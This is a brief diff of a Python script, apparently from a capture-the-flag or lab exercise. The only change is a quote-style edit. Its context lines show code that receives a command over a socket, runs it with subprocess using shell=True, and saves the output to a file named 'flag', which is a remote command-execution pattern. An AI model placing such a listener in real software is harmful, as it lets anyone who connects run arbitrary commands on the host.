@@ -8,5 +8,5 @@ command = c.recv(4096).decode()
 
 results = subprocess.run(command, capture_output=True, shell=True, text=True)
 
-with open('flag', 'w') as f:
+with open("flag", "w") as f:
     f.write(results.stdout)
